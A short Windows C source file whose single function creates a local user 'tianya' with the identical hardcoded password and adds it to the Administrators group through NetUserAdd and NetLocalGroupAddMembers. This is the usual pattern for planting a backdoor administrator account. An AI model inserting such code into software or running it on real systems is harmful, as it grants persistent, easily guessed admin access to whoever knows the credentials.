#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")

#include <stdio.h>
#include <assert.h>
#include <windows.h> 
#include <lm.h>

void OnAdduser()
{
	// TODO: Add your control notification handler code here
	// UpdateData(true);
	USER_INFO_1 ui;
	DWORD dwError = 0;

	ui.usri1_name = L"tianya";
	ui.usri1_password = L"tianya";
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;


	if (NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError) == NERR_Success)
	{
		//添加成功
		printf("添加用户成功!\n");
	}
	else
	{
		//添加失败
		printf("添加用户失败!\n");
	}


	wchar_t szAccountName[100] = { 0 };
	wcscpy(szAccountName, L"tianya");
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = szAccountName;
	//添加到Administrators组
	if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
	{
		//添加管理员组
		printf("添加到管理员组成功!\n");
	}
	else
	{
		//添加失败
		printf("添加到管理员组失败!\n");
	}
}